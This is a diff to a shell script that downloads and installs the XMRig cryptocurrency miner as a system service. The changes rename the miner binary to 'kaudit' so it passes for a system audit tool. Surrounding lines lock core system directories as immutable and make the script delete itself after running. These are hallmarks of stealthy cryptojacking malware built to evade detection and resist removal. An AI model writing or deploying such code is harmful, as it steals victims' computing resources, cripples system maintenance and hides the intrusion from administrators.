@@ -45,7 +45,6 @@ done
 
 # Lock critical directories
 sudo chattr -R +i /bin /usr/bin /sbin /usr/sbin 2>/dev/null || true
-done
 
 echo "[*] Starting XMRig Setup Script"
 
@@ -53,7 +52,7 @@ echo "[*] Starting XMRig Setup Script"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
 XMRIG_ARCHIVE="/tmp/xmrig.tar.gz"
 XMRIG_DIR="/opt/xmrig"
-XMRIG_BINARY="$XMRIG_DIR/xmrig"
+XMRIG_BINARY="$XMRIG_DIR/kaudit"
 SERVICE_FILE="/etc/systemd/system/xmrig.service"
 HUGE_PAGES=$((1280 + $(nproc)))
 
@@ -93,6 +92,12 @@ fi
 echo "[*] Unpacking XMRig to $XMRIG_DIR"
 sudo mkdir -p "$XMRIG_DIR"
 sudo tar -xzf "$XMRIG_ARCHIVE" -C "$XMRIG_DIR" --strip-components=1
+
+# Rename binary from xmrig to kaudit
+if [ -f "$XMRIG_DIR/xmrig" ]; then
+  sudo mv "$XMRIG_DIR/xmrig" "$XMRIG_BINARY"
+fi
+
 sudo chmod +x "$XMRIG_BINARY"
 rm -f "$XMRIG_ARCHIVE"
 
@@ -126,5 +131,3 @@ echo "[*] Done! Use 'sudo journalctl -u xmrig -f' to view miner logs"
 
 # Delete this script after execution
 rm -f "$(realpath "$0")"
-
-
